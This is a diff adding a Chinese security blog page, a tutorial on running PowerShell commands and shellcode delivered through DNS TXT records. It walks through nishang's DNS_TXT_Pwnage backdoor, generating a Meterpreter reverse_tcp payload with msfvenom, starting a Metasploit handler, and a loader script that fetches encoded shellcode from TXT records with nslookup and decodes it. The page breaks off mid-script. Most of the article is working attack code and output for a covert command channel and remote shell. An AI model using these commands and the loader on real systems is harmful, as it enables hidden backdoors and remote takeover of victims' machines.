@@ -1,0 +1,1698 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+
+
+
+
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.7.0">
+
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "198a1f28"
+    });
+  daovoice('update');
+  </script>
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: true,
+    lazyload: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="通过DNS TXT记录执行powershell0x00简介 DNS TXT记录一般用来记录某个主机名或者域名设置的说明，在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。本篇文章主要介绍如何使用nishang通过创建TXT记录执行powershell脚本。当然，首先你要有一个域名。 0x01创建TXT记录 这里需要使用nishang中的一个脚本OUT-D">
+<meta name="keywords" content="Powershell,metasploit,dns">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过DNS TXT记录执行powershell">
+<meta property="og:url" content="https://evi1cg.github.io/archives/ExecPowershell_Use_DNSTXT.html">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:description" content="通过DNS TXT记录执行powershell0x00简介 DNS TXT记录一般用来记录某个主机名或者域名设置的说明，在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。本篇文章主要介绍如何使用nishang通过创建TXT记录执行powershell脚本。当然，首先你要有一个域名。 0x01创建TXT记录 这里需要使用nishang中的一个脚本OUT-D">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3897134490.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1071326976.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1737944214.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/164680504.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1965447571.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2751166963.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1102714870.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/1772365813.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2887773737.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/2196646140.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3645057492.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/508159428.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/378494610.png">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3333443320.png">
+<meta property="og:updated_time" content="2019-01-15T05:43:36.772Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通过DNS TXT记录执行powershell">
+<meta name="twitter:description" content="通过DNS TXT记录执行powershell0x00简介 DNS TXT记录一般用来记录某个主机名或者域名设置的说明，在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。本篇文章主要介绍如何使用nishang通过创建TXT记录执行powershell脚本。当然，首先你要有一个域名。 0x01创建TXT记录 这里需要使用nishang中的一个脚本OUT-D">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2015/10/3897134490.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evi1cg's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://evi1cg.github.io/archives/ExecPowershell_Use_DNSTXT.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>通过DNS TXT记录执行powershell | Evi1cg's blog</title>
+  
+
+
+
+
+  <script async src="//www.googletagmanager.com/gtag/js?id=UA-132188022-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-132188022-1');
+  </script>
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</head>
+
+<body itemscope="" itemtype="https://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="https://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evi1cg's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档 menu-item-active">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archive" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-工具">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools" rel="section"><i class="menu-item-icon fa fa-fw fa-briefcase"></i> <br>工具</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-友链">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/friends" rel="section"><i class="menu-item-icon fa fa-fw fa-link"></i> <br>友链</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/ExecPowershell_Use_DNSTXT.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">通过DNS TXT记录执行powershell
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2015-10-08 01:52:00" itemprop="dateCreated datePublished" datetime="2015-10-08T01:52:00+08:00">2015-10-08</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/奇技淫巧/" itemprop="url" rel="index"><span itemprop="name">奇技淫巧</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/archives/ExecPowershell_Use_DNSTXT.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/ExecPowershell_Use_DNSTXT.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="通过DNS-TXT记录执行powershell"><a href="#通过DNS-TXT记录执行powershell" class="headerlink" title="通过DNS TXT记录执行powershell"></a>通过DNS TXT记录执行powershell</h1><h2 id="0x00简介"><a href="#0x00简介" class="headerlink" title="0x00简介"></a>0x00简介</h2><hr>
+<p>DNS TXT记录一般用来记录某个主机名或者域名设置的说明，在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。本篇文章主要介绍如何使用<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">nishang</a>通过创建TXT记录执行powershell脚本。当然，首先你要有一个域名。</p>
+<h2 id="0x01创建TXT记录"><a href="#0x01创建TXT记录" class="headerlink" title="0x01创建TXT记录"></a>0x01创建TXT记录</h2><hr>
+<p>这里需要使用nishang中的一个脚本<a href="https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1" target="_blank" rel="noopener">OUT-DnsTxt</a>。</p>
+<a id="more"></a>
+<h3 id="1-常见命令"><a href="#1-常见命令" class="headerlink" title="1.常见命令"></a>1.常见命令</h3><p>因为常见命令比较短，所以可以直接添加到TXT记录中，如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/3897134490.png" alt="1442571899611.png"></p>
+<p>现在查看一下TXT记录：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1071326976.png" alt="1442571948803.png"></p>
+<p>可以看到记录已经成功添加了。</p>
+<h3 id="2-脚本"><a href="#2-脚本" class="headerlink" title="2.脚本"></a>2.脚本</h3><p>由于TXT记录长度限制为255,如果要添加一个脚本到记录里面，需要添加多个TXT记录。下面是一个例子,自己写了一个PSH脚本：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-User</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment">Script to generate DNS TXT for a test.</span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">Use this script to get user information. to be more big.. more big... big..Do one thing at a time, and do well.Keep on going never give up.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">PS &gt; Get-User</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br><span class="line">[CmdletBinding()]</span><br><span class="line"><span class="keyword">Param</span> ()</span><br><span class="line">  net user</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>使用Out-Dnstxt进行转换：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS F:<span class="string">\DNS&gt;</span> . .<span class="string">\Out-DnsTxt.ps1</span></span><br><span class="line">PS F:<span class="string">\DNS&gt;</span> Out-DnsTxt -DataToEncode .<span class="string">\Get-User.ps1</span></span><br><span class="line">You need <span class="keyword">to</span> create <span class="number">2</span> TXT records.</span><br><span class="line">All TXT Records written <span class="keyword">to</span> F:<span class="string">\DNS\encodedtxt.txt</span></span><br></pre></td></tr></table></figure></p>
+<p>由于这个脚本比较小，所以只生产两行：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1737944214.png" alt="1442570198761.png"></p>
+<p>可以分别将这两行内容按顺序添加到 1.ps.domain.com到2.ps.domian.com中如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/164680504.png" alt="1442570265474.png"></p>
+<p>查看TXT，可以看到内容都已经添加好了：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1965447571.png" alt="1442570372800.png"></p>
+<h2 id="0x02-执行Powershell"><a href="#0x02-执行Powershell" class="headerlink" title="0x02 执行Powershell"></a>0x02 执行Powershell</h2><hr>
+<p>添加完了TXT记录以后，通过<a href="https://raw.githubusercontent.com/samratashok/nishang/master/Backdoors/DNS_TXT_Pwnage.ps1" target="_blank" rel="noopener">DNS_TXT_Pwnage.ps1</a>来执行这些脚本。</p>
+<blockquote>
+<p>DNS_TXT_Pwnage.ps1 是一个通过DNS TXT来接收命令或者脚本的一个后门脚本</p>
+</blockquote>
+<p>这里还需要添加两条记录，strat与stop，具体如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/2751166963.png" alt="1442569335887.png"></p>
+<h3 id="1-执行命令"><a href="#1-执行命令" class="headerlink" title="1.执行命令"></a>1.执行命令</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1</span><br><span class="line">PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start<span class="selector-class">.evi1cg</span><span class="selector-class">.me</span> -cmdstring start -commanddomain command<span class="selector-class">.evi1cg</span><span class="selector-class">.me</span> -psstring test -psdomain xxx<span class="selector-class">.evi1cg</span><span class="selector-class">.me</span> -</span><br><span class="line">Subdomains <span class="number">1</span> -StopString stop</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>解释一下参数：</p>
+<ul>
+<li><strong>startdomain</strong>为创建的<em>start.domain</em>，返回一个字符串；</li>
+<li><strong>cmdstring</strong> 为任意输入的字符串；</li>
+<li><strong>commanddomain</strong>为创建的执行命令TXT记录的域名；</li>
+<li><strong>psstring</strong>为任意输入的字符串；</li>
+<li><strong>psdomain</strong>为创建的执行脚本TXT记录的域名或子域名 ；</li>
+<li><strong>Subdomains</strong>为执行脚本创建TXT记录的个数（如1.2中创建的脚本，该值为2）；</li>
+<li><strong>StopString</strong>为任意输入的字符串。</li>
+</ul>
+</blockquote>
+<p>此处比较重要的参数为<strong>startdomain</strong>，他会与我们输入的cmdstring以及psstring进行比较，如果与cmdstring值相等，则执行<strong>commanddomain</strong> 即命令，与psstring相等则执行<strong>psdomain</strong>即脚本。</p>
+<p>上面为执行命令，所以cmdstring值我们输入为start，与start.evi1cg.me的txt记录值相等，psstring随便输入，不留空就行。执行结果如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1102714870.png" alt="1442570982298.png"></p>
+<p>我们可以通过修改command.domain的TXT值来执行不同的命令。比如Get-Host：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/1772365813.png" alt="1442571097947.png"></p>
+<h3 id="2-执行脚本"><a href="#2-执行脚本" class="headerlink" title="2.执行脚本"></a>2.执行脚本</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS F:\DNS&gt; . .\DNS_TXT_Pwnage.ps1</span><br><span class="line">PS F:\DNS&gt; DNS_TXT_Pwnage -startdomain start<span class="selector-class">.evi1cg</span><span class="selector-class">.me</span> -cmdstring bulabula -commanddomain command<span class="selector-class">.evi1cg</span><span class="selector-class">.me</span> -psstring start -psdomain ps.evi1</span><br><span class="line">cg<span class="selector-class">.me</span> -Arguments Get-User -Subdomains <span class="number">2</span> -StopString stop</span><br></pre></td></tr></table></figure>
+<p>这里要注意，psstring的值为start，与start.domain的TXT记录相同，cmdstring为任意字符串。效果如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/2887773737.png" alt="1442570823988.png"></p>
+<blockquote>
+<p>这里多一个参数<strong>Arguments</strong>，要写明要执行的函数名，测试发现，在脚本中含有中文时会失败。对于需要带参数的脚本可以修改脚本指定参数值。</p>
+</blockquote>
+<h2 id="0x03-执行Shellcode"><a href="#0x03-执行Shellcode" class="headerlink" title="0x03 执行Shellcode"></a>0x03 执行Shellcode</h2><hr>
+<p>可以通过TXT记录执行shellcode，首先，我们使用msf生成一个powershell的shellcode:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  sudo msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -f powershell LHOST=x<span class="selector-class">.x</span><span class="selector-class">.x</span><span class="selector-class">.x</span> LPORT=<span class="number">8887</span> &gt; pspayload.txt</span><br></pre></td></tr></table></figure></p>
+<p>使用Out-DnsTxt对生成的文件进行转换：<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS F:\DNS&gt; Out<span class="params">-DnsTxt</span> <span class="params">-DataToEncode</span> .\pspayload.txt</span><br><span class="line">You need <span class="keyword">to</span> create <span class="number">3</span> TXT <span class="keyword">records</span>.</span><br><span class="line"><span class="literal">All</span> TXT <span class="keyword">Records</span> written <span class="keyword">to</span> F:\DNS\encodedtxt.txt</span><br></pre></td></tr></table></figure></p>
+<p>然后将以上记录分别添加到TXT记录中，如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/10/2196646140.png" alt="1442636300235.png"></p>
+<p>测试使用的32位win7系统，使用msf开启监听：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 8887</span><br><span class="line">LPORT =&gt; 8887</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST x.x.x.x</span><br><span class="line">LHOST =&gt; x.x.x.x</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse handler on x.x.x.x:8887</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure></p>
+<p>我们还需要一个获取TXT记录并执行的脚本，这里我改了一个脚本：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Execute-Code</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Shelldomain</span></span></span><br><span class="line"><span class="comment">The domain (or subdomain) whose subbdomain's TXT records would hold shellcode.</span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER subdomains</span></span></span><br><span class="line"><span class="comment">The number of subdomains which would be used to provide shellcode from their TXT records.</span></span><br><span class="line"><span class="comment"> <span class="doctag">.PARAMETER AUTHNS</span></span></span><br><span class="line"><span class="comment">Authoritative Name Server for the domains.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">PS &gt; Execute-Code</span></span><br><span class="line"><span class="comment">The payload will ask for all required options.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">PS &gt; Execute-Code -Shelldomain 32.alteredsecurity.com -SubDomains 5 -AUTHNS f1g1ns2.dnspod.net.</span></span><br><span class="line"><span class="comment">Use above from non-interactive shell.</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">  [CmdletBinding()] <span class="keyword">Param</span>(</span><br><span class="line">        [Parameter(Position = <span class="number">0</span>, Mandatory = <span class="literal">$True</span>)]</span><br><span class="line">        [String]</span><br><span class="line">        <span class="variable">$Shelldomain</span>,</span><br><span class="line">        [Parameter(Position = <span class="number">1</span>, Mandatory = <span class="literal">$True</span>)]</span><br><span class="line">        [String]</span><br><span class="line">        <span class="variable">$Subdomains</span>,     </span><br><span class="line">        [Parameter(Position = <span class="number">2</span>, Mandatory = <span class="literal">$True</span>)]</span><br><span class="line">        [String]</span><br><span class="line">        <span class="variable">$AUTHNS</span></span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">function</span> Get-ShellCode</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">Param</span>(</span><br><span class="line">            [Parameter()]</span><br><span class="line">            [String]</span><br><span class="line">            <span class="variable">$Shelldomain</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$i</span> <span class="nomarkup">-le</span> <span class="variable">$subdomains</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$getcommand</span> = (<span class="built_in">Invoke-Expression</span> <span class="string">"nslookup -querytype=txt <span class="variable">$i</span>.<span class="variable">$Shelldomain</span> <span class="variable">$AUTHNS</span>"</span>) </span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable">$getcommand</span> | <span class="built_in">select-string</span> -pattern <span class="string">"`""</span></span><br><span class="line">            <span class="variable">$tmp1</span> = <span class="string">""</span></span><br><span class="line">            <span class="variable">$tmp1</span> = <span class="variable">$tmp1</span> + <span class="variable">$temp</span></span><br><span class="line">            <span class="variable">$encdata</span> = <span class="variable">$encdata</span> + <span class="variable">$tmp1</span> <span class="nomarkup">-replace</span> <span class="string">'\s+'</span>, <span class="string">""</span> <span class="nomarkup">-replace</span> <span class="string">"`""</span>, <span class="string">""</span></span><br><span class="line">            <span class="variable">$i</span>++</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">#$encdata = ""</span></span><br><span class="line">        <span class="variable">$dec</span> = [System.Convert]::FromBase64String(<span class="variable">$encdata</span>)</span><br><span class="line">        <span class="variable">$ms</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream</span><br><span class="line">        <span class="variable">$ms</span>.Write(<span class="variable">$dec</span>, <span class="number">0</span>, <span class="variable">$dec</span>.Length)</span><br><span class="line">        <span class="variable">$ms</span>.Seek(<span class="number">0</span>,<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">        <span class="variable">$cs</span> = <span class="built_in">New-Object</span> System.IO.Compression.DeflateStream (<span class="variable">$ms</span>, [System.IO.Compression.CompressionMode]::Decompress)</span><br><span class="line">        <span class="variable">$sr</span> = <span class="built_in">New-Object</span> System.IO.StreamReader(<span class="variable">$cs</span>)</span><br><span class="line">        <span class="variable">$sc</span> = <span class="variable">$sr</span>.readtoend()</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sc</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$Shell</span> = (Get-ShellCode <span class="variable">$Shelldomain</span>)</span><br><span class="line">    <span class="comment">#Remove unrequired things from msf shellcode</span></span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$Shell</span> <span class="nomarkup">-replace</span> <span class="string">"`n"</span>,<span class="string">""</span> <span class="nomarkup">-replace</span> <span class="string">'\$buf \+\= '</span>,<span class="string">","</span> <span class="nomarkup">-replace</span> <span class="string">'\[Byte\[\]\] \$buf \='</span> <span class="nomarkup">-replace</span> <span class="string">" "</span></span><br><span class="line">    